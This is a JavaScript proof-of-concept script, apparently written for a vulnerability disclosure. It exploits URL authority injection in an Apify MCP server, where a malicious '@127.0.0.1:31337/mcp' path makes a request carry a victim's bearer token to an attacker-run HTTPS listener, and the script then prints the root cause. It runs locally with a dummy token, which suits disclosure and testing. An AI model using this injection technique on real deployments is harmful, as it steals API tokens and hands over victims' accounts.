import https from 'https';
import fs from 'fs';
import { URL } from 'url';

// ========== Configuration ==========
const ATTACKER_PORT = 31337;
const ATTACKER_HOST = '127.0.0.1';
const VICTIM_TOKEN = 'apify_api_VICTIM_SECRET_TOKEN_DEMO_12345';
const CERT_FILE = './attacker-cert.pem';
const KEY_FILE = './attacker-key.pem';

// Attacker-controlled webServerMcpPath from a malicious Actor definition
const MALICIOUS_PATH = '@127.0.0.1:31337/mcp';
const STANDBY_URL = 'https://hello-world.apify.actor';

console.log('╔════════════════════════════════════════════════════════════╗');
console.log('║  Apify MCP Server — URL Authority Injection PoC          ║');
console.log('║  CVE-2026-XXXXX  |  CVSS 8.1 (High)                      ║');
console.log('╚════════════════════════════════════════════════════════════╝');
console.log('');

// Validate TLS certificates exist
if (!fs.existsSync(CERT_FILE) || !fs.existsSync(KEY_FILE)) {
  console.error('❌  Missing TLS certificates. Generate them first:');
  console.error('   openssl req -x509 -newkey rsa:2048 -keyout attacker-key.pem -out attacker-cert.pem -days 1 -nodes -subj \'/CN=127.0.0.1\' -addext \'subjectAltName=IP:127.0.0.1\'');
  process.exit(1);
}

// ========== Phase 1: URL Injection Analysis ==========
console.log('[Phase 1/3] Analyzing URL injection');
console.log('  standbyUrl    :', STANDBY_URL);
console.log('  mcpServerPath :', MALICIOUS_PATH);

const injectedUrl = `${STANDBY_URL}${MALICIOUS_PATH}`;
console.log('  Concatenation :', injectedUrl);

const parsed = new URL(injectedUrl);
console.log('');
console.log('  Parsed URL:');
console.log('    username  ->', parsed.username);
console.log('    hostname  ->', parsed.hostname);
console.log('    port      ->', parsed.port);
console.log('    pathname  ->', parsed.pathname);
console.log('    href      ->', parsed.href);
console.log('');

if (parsed.hostname === '127.0.0.1') {
  console.log('  ✅  URL injection confirmed: request will be redirected to attacker server');
} else {
  console.log('  ❌  URL injection failed');
  process.exit(1);
}
console.log('');

// ========== Phase 2: Start Attacker HTTPS Server ==========
console.log('[Phase 2/3] Starting attacker HTTPS server...');

const serverOptions = {
  key: fs.readFileSync(KEY_FILE),
  cert: fs.readFileSync(CERT_FILE),
};

const server = https.createServer(serverOptions, (req, res) => {
  console.log('');
  console.log('╔════════════════════════════════════════════════════════════╗');
  console.log('║  🚨  ATTACKER SERVER RECEIVED REQUEST!                     ║');
  console.log('╚════════════════════════════════════════════════════════════╝');
  console.log('  Authorization :', req.headers.authorization);
  console.log('  URL           :', req.url);
  console.log('  Host          :', req.headers.host);
  console.log('  Method        :', req.method);
  console.log('');
  res.end('TOKEN CAPTURED');

  // Shut down after receiving the token
  setTimeout(() => {
    server.close(() => {
      console.log('[Phase 3/3] Exploit Result');
      console.log('');
      console.log('✅  Successfully captured victim\'s Apify API Token!');
      console.log('   Token :', req.headers.authorization);
      console.log('');
      console.log('⚠️   Impact Analysis:');
      console.log('   • Attacker can fully control the victim\'s Apify account');
      console.log('   • Run arbitrary Actors, access datasets, key-value stores');
      console.log('   • Consume victim\'s compute quota and incur charges');
      console.log('   • No code execution or special privileges required on victim side');
      console.log('   • Victim only needs to invoke a malicious Actor via MCP tools');
      console.log('');
      console.log('🔴  Root Cause:');
      console.log('   standbyUrl + mcpServerPath uses string concatenation without');
      console.log('   validating that mcpServerPath is a relative path. The @ symbol');
      console.log('   injects a new authority, redirecting the request to attacker host');
      console.log('   while the Authorization: Bearer <TOKEN> header is still attached.');
      console.log('');
      console.log('╔════════════════════════════════════════════════════════════╗');
      console.log('║  PoC COMPLETE — Token exfiltration verified                ║');
      console.log('╚════════════════════════════════════════════════════════════╝');
      process.exit(0);
    });
  }, 500);
});

// Start server then immediately send malicious request
server.listen(ATTACKER_PORT, ATTACKER_HOST, () => {
  console.log('  Listening on https://' + ATTACKER_HOST + ':' + ATTACKER_PORT);
  console.log('');

  // ========== Phase 3: Send request with victim token ==========
  console.log('[Phase 3/3] Sending request with victim\'s bearer token...');
  console.log('  Authorization: Bearer', VICTIM_TOKEN.slice(0, 25) + '...');

  const reqOptions = {
    hostname: parsed.hostname,
    port: parsed.port || 443,
    path: parsed.pathname,
    method: 'GET',
    rejectUnauthorized: false, // Trust self-signed cert for PoC
    headers: {
      'Authorization': `Bearer ${VICTIM_TOKEN}`,
      'Host': parsed.host,
    },
  };

  const req = https.request(reqOptions, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      if (data.includes('TOKEN CAPTURED')) {
        // Server will print logs and exit
      }
    });
  });

  req.on('error', (e) => {
    console.error('  ❌  Request failed:', e.message);
    server.close();
    process.exit(1);
  });

  req.end();
});
